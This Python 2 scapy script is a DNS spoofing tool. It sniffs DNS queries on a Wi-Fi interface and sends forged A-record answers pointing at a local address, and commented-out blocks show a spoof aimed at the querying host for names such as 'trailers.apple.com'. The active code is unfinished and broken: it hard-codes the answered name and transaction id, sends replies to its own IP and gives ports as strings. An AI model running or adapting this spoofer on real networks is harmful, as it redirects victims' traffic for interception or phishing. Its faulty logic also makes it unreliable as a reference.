import os
# from __future__ import print_function
from scapy.all import *
 
local_ip = '172.16.165.170'
dev = "wlp2s0"
filter = "udp port 53"
dns_map = {}

def handle_packet(packet):
	ip = packet.getlayer(IP)
	udp = packet.getlayer(UDP)
	dhcp = packet.getlayer(DHCP)

	# standard (a record) dns query
	if packet[DNS].qr == 0 and packet[DNS].opcode == 0:
		queried_host = packet[DNS].qd.qname[:-1]
		resolved_ip = local_ip

		if dns_map.get(queried_host):
			resolved_ip = dns_map.get(queried_host)
		elif dns_map.get('*'):
			resolved_ip = dns_map.get('*')

		if resolved_ip:
			dns_answer = DNSRR(rrname='nacho.com' + ".",
									 ttl=330,
									 type="A",
									 rclass="IN",
									 rdata=local_ip)

			dns_reply = IP(src='172.16.165.170', dst='172.16.165.170') / \
						UDP(sport='53',
								  dport='53') / \
						DNS(
							id = 11537,
							qr = 1,
							aa = 0,
							rcode = 0,
							qd = None,
							an = dns_answer
						)

			print "Send %s has %s to %s" % (queried_host,
											resolved_ip,
											'172.16.165.170')
			send(dns_reply, iface=dev)

			dns_reply.show()
		# send( spoofedIPPkt / spoofedUDP_TCPPacket / spoofedDNSPacket, iface='wlp2s0', count=1)


	# os.system('clear')
	# pkt.show()
	# spfResp = IP(dst=pkt[IP].src)\
	#         /UDP(dport=pkt[UDP].sport, sport=53)\
	#         /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname="inc.fa.com",rdata=local_ip)\
	#         /DNSRR(rrname='inc.fa.com',rdata=local_ip))
	# send(spfResp, verbose=0)

	# print(pkt[DNSQR].qname)

	# spfResp.show()

	# print('Packet sent to ' + pkt[IP].src)
		
		# if 'trailers.apple.com' in str(pkt['DNS Question Record'].qname):
		#     spfResp = IP(dst=pkt[IP].src)\
		#         /UDP(dport=pkt[UDP].sport, sport=53)\
		#         /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip)\
		#         /DNSRR(rrname='trailers.apple.com',rdata=local_ip))
		#     send(spfResp, verbose=0)
		#     return 'Spoofed DNS Response Sent'

		# else:
		#     # make DNS query, capturing the answer and send the answer
		#     return forward_dns(pkt)

os.system('clear')

print('Empezamos')

sniff(filter=filter , iface='wlp2s0', store=0, prn=handle_packet)